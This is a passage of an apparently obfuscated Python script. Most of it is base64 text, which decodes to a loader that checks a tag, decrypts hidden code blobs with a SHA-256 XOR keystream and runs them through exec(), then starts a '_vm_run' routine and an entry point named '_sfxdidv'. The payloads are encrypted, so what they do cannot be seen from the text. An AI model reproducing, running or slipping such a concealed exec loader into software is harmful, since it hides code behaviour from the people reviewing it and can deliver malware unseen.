JvMGU2a1N2UEYvdjVUS3Y4V1hwdjZZY0JNZ2twN25mVDVac3FVUXROZHhQTUJrRGJ2YUlhN2k1a3VxdUQ1cC80aURHTVFCM1FRb0VTdDh1OWxVL2lDR1kyQnNGNERwMGlQbUVyRFdJTjZ3MTVEMjVEeFNJYXArQXdhY1hoUTZEbHdsY0pyMnhiZ3hNd24rT20rRGkxZ2JVTnpEYjkraWtZb3R2UFQ1Nkg3MHFpNmxQNlBhRDRHSG1rdlN4b0hUY1F5OFR5eThOS0l5bXVWQzV4YWVsSmVZQnZKWG5CaWx6cEMyVStUWFNkcVI5d2Jwb2hQMHZUUU9wVWJFZnVkWWJpcDFFZlpPTVh0eHBEVzlJYWdCdjVnU2tFejFCaXYwU0tuV0VNNXlsMWxKZFZYNVdybUx6aEFpNmNoRGwwdVBvaUhoMzFyY0ZaVzJMRWJETDVXYWZzOUNRTW5tNU1scEVlcDBERkF6aTZ5aXJMWEZWUHJ0Rm5xVEVlN3hQZFNxVGhtNkZMM0ZoZXFZRW1leEdIb0hTTE1wMDR6WmpwaUxJYnV2bVlwU2xWRDIzclFLOXE5MXlRRUREekhnOUpIWk5UVDlSMkg4MFFycGlmMU5WNTJDS2ZicGZsZFNMZFUyNnBmRkVsbWIyckFWZld4RGMvZmR4Rm9oSzRFRDZ0bmVFUmd2N3JpRTRZZndjTW9ra2pWV2lyVGNDejFobHFLc0gzS29YRlBYRk8vS3dPOHhIM3hIRkYweWdlTmRGcTdGR0ZSWG4zMWp2Wko2TlppVWNDS0liaVpMME51aEh5Mk1IbmJSUDVzK3d3MFpobGVvK0hMZ2Z6YjhmWmdUWWl0OFVTMWpjVUZrK1JwNE9LN3ZnVjliZXpMVWlyV2o5ZmMzcnU5UGZvdkdGNForcVNDMHlDTXBSSGFOekFjU3VSbmpFVG02aHd0dy85ZUFKaDJCd3BMTGt0eExnQ1ZaOWFsRVJoSkdYUzJRRG1QK0RNNWRWWUtlbFhLL0FxdjB5ZjVUQkxrYTlEYjVxVnd3R1EwdmFBUTlUNndLcmpidjBXeFVaaU1DTWl3VE8wOWdhdm0xR21yMURqVktBWG00ZURKWUYxMlBsVXVXUkR2enl2Q3JCL3AyWmpYQUFvcTFzTlhZUTAxOG96UE1NRDYxd3hJTUhrdmJvSWhjRlBQNFpTN2NnS1VPbjBwbWZhNUhaOGxVT1M2RmNFdkx6TXpuSmhXQ2U5U2UxaDRpZHFsbzdZQml5V2kya0EzTnFjL0ROd1F1MzNSZFJXOFRIM0VpZG5vaUltUlFDTDNmMjdiL2JwVm91T29UN1VZTmJyaTg0NjIvNXN6Z0Y2OEFRYUhGVFA0UHpsZlBlVWYwdlZYTlJvcXNmNnlGcy8rRG1qSGR1Q2VMUzlYVkdQNytzcU0vTGQrS2tGd3lSNXZGOHVLdTYzM0QrVXVSVk5aNEVJY2Mzcnh4NTFEMXBlVGZrTEt5K3AyK2Ribm44K0hFUGRMeWl5RU1xYk5pa1cxRlVTbWZIcUtxNVNOMldiVnozK2JVa0M1TXNqMG05dTBacmxrOHYzWDlBdGsxUTFkakl0ZzBMSTdjUXBwcDN4Z1hJcDIvb0dxaFp3bzIrMDhRVWhqeGsyaTFrc05GajhLZ0lldG9hYU0rNWhaMVU0TWs0UzdIS0JLOHlVT0RwSGtNYmpvOVpabUNhZnZUNERHYlpVaFc2VEg0ekptb3kxY0xiME51Zlo2YmhVS0N5ZVUyTFBIenVHeit6OFQ1Q3JkdkxBd3VlM3YvNUJXOWpBWlBicnNrWEVqQ3gvWlpCUUlCNjdGZ2Q4cHJHY21qVThnNHpyL0RMSTZNT0ZPTTFqdDFNb2Vwb2NTakEwWm1hODZLdUJBOHR4NjFOejdSZmhxNHRCVjE4a2h6RXZyNXJxK2FNNGVxTDViRFJqREFDL1F2UGxldFUyclhUT2czeVZTbDhYM0o4VXUySDU1aUE1bDFWOXljS1djNEdueWwrOXlxVnB4TDl3RnEweStPZXpXcmpWNXBla2JFT2Q1Z3hyREg1SUs1dlRRb05sc1ZNNGU5UUVIdkc5TllTbW1TelppdmRWYTJKYXMwWU5hL3h0NjVlNy9wREhQTFR6LzdPeWxIS2ZSQ1R5R3dnWm5vNW5pU0prL2FJMUNuU2RmcUdnbUNoc3p4UTFHc3RWMU00K2FjeWZ1bjZqbHdQUUpXbi83UkpYS1JMK3Bod0ZWTVV1cmNWUDRLakRBVXhkWmRXT2FlZEg5RXNPbG1BdnozMXhkSlV4Q1BzVGNaaGRwM01QTzIrb3dOMksrOHNCTGtvQWFoZ2pWMEQydzl4b2YvTU1iUllJUlYrcjRCNVdSeFFTcHhTeFlET2RFOGMwOE1OVjNMamxUY2xVMHRwSGhEbzBuVHN3Nm5IN3ByVTl3MEQybWlISG1BVUpEdFMxS1Q0bDVRUEF2MHJVY2tKWmZvNlYwaFM1TVNQbjRIM1dxM09uY29KQVdwSG1RZ3FiSkV6YlR0L0dZRzFZZFhxcWQ1UmRQR3ZZOE10eWpYR0JXYi8wSXZUZzBiZk13blF2UENmcmJqdjB1WFgra3JQb3hyYVdzMy9vaDdlckxxdFNKYVhXK3lLMGljOWNVT2oyV3hyKzhYNGMwOVM2dyswWUFoSDR0MEprUkVIcHNWZkhQSStFVkE2cGVTU09NSUhLemVGNDRna3Zkek0zbHRzM1dRVUw4eC9kMng1dEV5WDNncHVrQ21LSXFsb2E5dzFQaVVwVjhiQzZDbkthZDBjZVdDRHdJWmdxeTNMTEprNEdVUEpmQ2Roc2txcXJSVEoyUUo1cm5yaEZsS0oxUUVxcXllMlE0TVRmaFpqT00zU1JuWENEY2gyTEVjZWlnN0lYbzAvNm1odTVSb3l5MWNJVGpsTEFtY3RVSHdtQ1Z1MWFRc0tWS0JsNVczM2phaHNpQ0phMjdzT1pRN3lpSC9YZUp0bnhwbWxYemgzMEV6QTNHbWlWVFNaWEtvU3A4bEpiQkpqRndMZWtWZ0YvQU1wNVNKZ0FnQUNpa1VnUXJTUmVNUk9CYndQTTNFVkMzZU9XRnRqdGkxYkg2SGhHcFduQ3dYZGVjVjgveTVtNG5uWjhSVDZNdkRNSmdrU1dUeE1kUXJ1VVE0SzNCOU5qVnRoMUNqZi8rWmdHdEtzZWFGK21tM1NkRW45bDdRU2JaUXNmbkprdzUrMENrZ2pqMFRHZE9NdzhwNEY3b0c1ZGo3bGZCanlrRDE5VTdlTGQzb0tyTDZUTXJVNjIwSDYrOE91TGRlWTVqdHNyWWlqSzlVR2Nxb2FlaXV0THc2M3ZPaUpmcFo4TU9zVjBmZjlRSE9rSVAzUTUrdHEyUTFUKzdKQlpWQ00xLytibkJrT0JmMVlrTWNTV0lqWkE1T3B4dnRkZnhTQU5LeXNabWZMVmJaMHpKMG5pY2o5emk0RnNSaFV0RXFZZXU2UGRSaXhER0RZNTVOM1RYY3dsRzl3eTFJT3R1UTBidFdzWnVNNXRNRGZOVmFOYzZxNWhxbHNNVUw2aDhnd2NNOEVXRjBQcDhhOXVQMzlJMnNablhvdlV0WWVBY3diRzJjWGtNQmkvK2pITmVDTis0ZDQwSDQ4WHQyR2R3Um9MUHhXM0NhblNnUWU0bGJ0YnVTWDhnQXpOYXR3NmhqRTlCN0tQOC91cmF4WncyS3V0SkhBa1MzMFFCS2pKUkVjb3FoWThYeUIvQ0pGUnYyM1R6L1RpM1NnVDg2UWpjdXZWUm44S3BJUWFzM2lTSkhXSDZOeVdKQ1o5WFRPS0tza3RtbTg0RGRQekhGYlYwT3pwZkxiK0ZXMTdYbzlJTjVGVDZwT0JXdUlkak1uczFFY2N2bFhLVDlyU09wV0V6cW85b09UMjdoeHlEK0ZoaDRqNW1wQlBxWkxmczI1dkNTZWFGeUU4RjNqSG1BVzdwTXgyaGRQc3ozT0NKaUV0NVR3eXR6Ty90eGYzMG9OdmRiMTdwY1VRN1ZvdlU0RjJpbGtJbGhjMTFsV2FhRjRhcWtkNHpzNTJnaXEzSEJ5ZlZSRERMZk9EMkxJR1JSL29DMlgvTkpkMG5qQ083WjZlT0cxUEV3ZCtDK2JjVm8xWUlEOFlhdm90bDVSeHZlZ1l0WHZoK0ZLc0hMUDRobmpvY3VPYVg2SGRXbFVZcjQzNU50RHRpeEpPZENPQXVXcVNLVHZNUXdESWpwSFlkYlNNMUd1dDcyWDhic3VRYUxBSk0zbk83dUFQUUMyTVMrOUc4ZmJleDljRkVJTUdmbDBablhEVmtaNzJ1MkhZblZ0a2xmbHl5bGxSTC9rWUZDNitLeklWenllN2tMSHhrdnpxUy9qMU1WTzgwSHc1N3NBYmcyQi8yTFcxRnkycE53ZWJTWitONWlWeXltaG4vZXZHQnJscXF4QS94RFRSMXN0OW10SzdIc0ZsejVyZ0VjdisvRmRDTFpiVkpFeFRPcldyVU0wMHNJaTNDS3N4dE9zL3l1aXY5SHpQeFUwOSt6MGt0cmtTZ3Buc21jeThod1N2dzlwWmVRbUVjRzlpMURSYmFMUkViK05jK2V3QVhoMzNUelNSVHJVVDNOTWtNVnZhUCs5UkFDZ0ZOMVB0c05CMUYzNnF5TzBveTJPdjRIRXc9PScpXQpfRlVOQ19DQUNIRSA9IHt9CgpkZWYgX2V4ZWNfZW5jKGlkeCwga2V5LCBuYW1lLCBhcmdzLCBrd2FyZ3MpOgogICAgaWYgbmFtZSBpbiBfRlVOQ19DQUNIRToKICAgICAgICByZXR1cm4gX0ZVTkNfQ0FDSEVbbmFtZV0oKmFyZ3MsICoqa3dhcmdzKQogICAgcmF3ID0gX0ZFTkNfREFUQVtpZHhdCiAgICBub25jZSwgdGFnID0gKHJhd1s6MTZdLCByYXdbLTE2Ol0pCiAgICBjdCA9IHJhd1sxNjotMTZdCiAgICBhdXRoX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInYXV0aHYxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIGlmIG5vdCBobWFjLmNvbXBhcmVfZGlnZXN0KGhhc2hsaWIuc2hhMjU2KGF1dGhfa2V5ICsgY3QpLmRpZ2VzdCgpWzoxNl0sIHRhZyk6CiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCdbZnVuY2VuY10gaW50ZWdyaXR5IGNoZWNrIGZhaWxlZCcpCiAgICBlbmNfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidlbmN2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBwbGFpbl9ieXRlcyA9IF94b3Jfc3RyZWFtKGVuY19rZXksIGN0KQogICAgcGxhaW5fc3RyID0gcGxhaW5fYnl0ZXMuZGVjb2RlKCd1dGYtOCcpCiAgICBucyA9IHt9CiAgICBleGVjKHBsYWluX3N0ciwgZ2xvYmFscygpLCBucykKICAgIGZ1bmMgPSBuc1snX2YnXQogICAgX0ZVTkNfQ0FDSEVbbmFtZV0gPSBmdW5jCiAgICByZXN1bHQgPSBmdW5jKCphcmdzLCAqKmt3YXJncykKICAgIHJldHVybiByZXN1bHQKCmFzeW5jIGRlZiBfZXhlY19lbmNfYXN5bmMoaWR4LCBrZXksIG5hbWUsIGFyZ3MsIGt3YXJncyk6CiAgICBpZiBuYW1lIGluIF9GVU5DX0NBQ0hFOgogICAgICAgIHJldHVybiBhd2FpdCBfRlVOQ19DQUNIRVtuYW1lXSgqYXJncywgKiprd2FyZ3MpCiAgICByYXcgPSBfRkVOQ19EQVRBW2lkeF0KICAgIG5vbmNlLCB0YWcgPSAocmF3WzoxNl0sIHJhd1stMTY6XSkKICAgIGN0ID0gcmF3WzE2Oi0xNl0KICAgIGF1dGhfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidhdXRodjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgaWYgbm90IGhtYWMuY29tcGFyZV9kaWdlc3QoaGFzaGxpYi5zaGEyNTYoYXV0aF9rZXkgKyBjdCkuZGlnZXN0KClbOjE2XSwgdGFnKToKICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoJ1tmdW5jZW5jXSBpbnRlZ3JpdHkgY2hlY2sgZmFpbGVkJykKICAgIGVuY19rZXkgPSBoYXNobGliLnNoYTI1NihiJ2VuY3YxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIHBsYWluX2J5dGVzID0gX3hvcl9zdHJlYW0oZW5jX2tleSwgY3QpCiAgICBwbGFpbl9zdHIgPSBwbGFpbl9ieXRlcy5kZWNvZGUoJ3V0Zi04JykKICAgIG5zID0ge30KICAgIGV4ZWMocGxhaW5fc3RyLCBnbG9iYWxzKCksIG5zKQogICAgZnVuYyA9IG5zWydfZiddCiAgICBfRlVOQ19DQUNIRVtuYW1lXSA9IGZ1bmMKICAgIHJlc3VsdCA9IGF3YWl0IGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgcmV0dXJuIHJlc3VsdAoKZGVmIF94b3Jfc3RyZWFtKGtleSwgZGF0YSk6CiAgICByZXN1bHQgPSBieXRlYXJyYXkoKQogICAgY291bnRlciA9IDAKICAgIHdoaWxlIGxlbihyZXN1bHQpIDwgbGVuKGRhdGEpOgogICAgICAgIGtzID0gaGFzaGxpYi5zaGEyNTYoa2V5ICsgY291bnRlci50b19ieXRlcyg4LCAnYmlnJykpLmRpZ2VzdCgpCiAgICAgICAgY2h1bmsgPSBkYXRhW2xlbihyZXN1bHQpOmxlbihyZXN1bHQpICsgMzJdCiAgICAgICAgZm9yIGEsIGIgaW4gemlwKGNodW5rLCBrcyk6CiAgICAgICAgICAgIHJlc3VsdC5hcHBlbmQoYSBeIGIpCiAgICAgICAgY291bnRlciArPSAxCiAgICByZXR1cm4gYnl0ZXMocmVzdWx0KQoKZGVmIF9iKCphcmdzLCAqKmt3YXJncyk6CiAgICByZXR1cm4gX2V4ZWNfZW5jKDAsIF9GVU5DX0tFWSwgJ19iJywgYXJncywga3dhcmdzKQoKZGVmIF9lKCphcmdzLCAqKmt3YXJncyk6CiAgICByZXR1cm4gX2V4ZWNfZW5jKDEsIF9GVU5DX0tFWSwgJ19lJywgYXJncywga3dhcmdzKQoKZGVmIF9mKCphcmdzLCAqKmt3YXJncyk6CiAgICByZXR1cm4gX2V4ZWNfZW5jKDIsIF9GVU5DX0tFWSwgJ19mJywgYXJncywga3dhcmdzKQoKZGVmIF9nKCphcmdzLCAqKmt3YXJncyk6CiAgICByZXR1cm4gX2V4ZWNfZW5jKDMsIF9GVU5DX0tFWSwgJ19nJywgYXJncywga3dhcmdzKQ=="), '<exec>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok, _ht, _pf)
if __name__ == '__main__':
    _sfxdidv()
